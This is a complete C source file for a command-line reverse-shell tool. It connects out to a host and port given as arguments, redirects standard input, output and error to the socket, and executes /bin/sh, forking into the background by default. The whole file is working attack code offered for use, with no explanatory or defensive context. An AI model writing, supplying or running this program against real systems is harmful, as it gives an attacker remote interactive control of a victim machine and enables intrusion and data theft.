#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>

#define PROGNAME	"reverse-shell"
#define SHELL		"sh"
#define PATH		"/bin"
#define PATHSHELL	PATH "/" SHELL

#include "common.h"


#define RSHELL_F_NOFORK	(1 << 0)

struct rshell
{
	char		*host;
	char		*service;
	uint16_t	port;
	int		family;
	char		*shell;
	unsigned	flags;
};


static void usage(void)
{
	fprintf(stderr, "usage: %s [options] <host> <port>\n", PROGNAME);
	fprintf(stderr, "options:\n");
	fprintf(stderr, "\t-h         : display this and exit\n");
	fprintf(stderr, "\t-v         : display version and exit\n");
	fprintf(stderr, "\t-f         : foreground mode (eg: no fork)\n");
	fprintf(stderr, "\t-4         : use IPv4 socket\n");
	fprintf(stderr, "\t-6         : use IPv6 socket\n");
	fprintf(stderr, "\t-s <shell> : give the path shell (default: %s)\n", PATHSHELL);
}


static char *rshell_basename(char *path)
{
	char		*ptr;
	size_t		len = strlen(path);

	for ( ptr = path + len ; ptr >= path ; ptr--)
	{
		if ( ptr[0] == '/' )
			return ++ptr;
	}

	return path;
}


static void reverse_tcp(const struct rshell *rshell)
{
	int		sockfd;
	struct addrinfo	hints,
			*result,
			*rp;
	int		ret;
	char		*ex[3];

	memset(&hints, 0, sizeof hints);
	hints.ai_family = rshell->family;
	hints.ai_socktype = SOCK_STREAM;

	if ( (ret = getaddrinfo(rshell->host, rshell->service, &hints, &result)) != 0 )
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(ret));
		return;
	}

	/* getaddrinfo() returns a list of address structures.
	 * Try each address until we successfully bind().
	 */
	for ( rp = result ; rp != NULL ; rp = rp->ai_next )
	{
		if ( (sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)) < 0 )
			continue;

		if ( connect(sockfd, rp->ai_addr, rp->ai_addrlen) == 0 )
			break;

		close(sockfd);
	}

	freeaddrinfo(result);

	if ( rp == NULL )
	{
		fprintf(stderr, "Could not bind any socket.\n");
		return;
	}

	/* Replace stdin, stdout and stderr from the socket
	 */
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	ex[0] = rshell->shell;
	ex[1] = rshell_basename(rshell->shell);
	ex[2] = NULL;

	execve(ex[0], &ex[1], NULL);

	/* Should never get here
	 */
}


static void rshell_init(struct rshell *rshell)
{
	rshell->family = AF_UNSPEC;
	rshell->shell = PATHSHELL;
	rshell->flags = 0;
}


static int rshell_set_port(struct rshell *rshell, char *port)
{
	long int	res;

	res = strtol(port, NULL, 10);

	if ( res <= 0 || res > 0xffff )
		return -1;

	rshell->service = port;
	rshell->port = (uint16_t) res;

	return 0;
}


int main(int argc, char *argv[])
{
	int		c;
	pid_t		child;
	struct rshell	rshell;

	rshell_init(&rshell);

	while ( (c = getopt(argc, argv, "46fhs:v")) != -1 )
	{
		switch ( c )
		{
			case '4':
			rshell.family = AF_INET;
			break;

			case '6':
			rshell.family = AF_INET6;
			break;

			case 'f':
			rshell.flags |= RSHELL_F_NOFORK;
			break;

			case 'h':
			usage();
			return 0;

			case 's':
			rshell.shell = optarg;
			break;

			case 'v':
			version();
			return 0;
		}
	}

	argv += optind;
	argc -= optind;

	if ( argc != 2 )
	{
		usage();
		return -1;
	}

	rshell.host = argv[0];
	if ( rshell_set_port(&rshell, argv[1]) )
	{
		fprintf(stderr, "Invalid port %s\n", argv[1]);
		return -1;
	}

	/* Fork and connect back
	 */
	if ( (rshell.flags & RSHELL_F_NOFORK) || (child = fork()) == 0 )
		reverse_tcp(&rshell);
	else
		printf("child pid: %d\n", child);

	return 0;
}
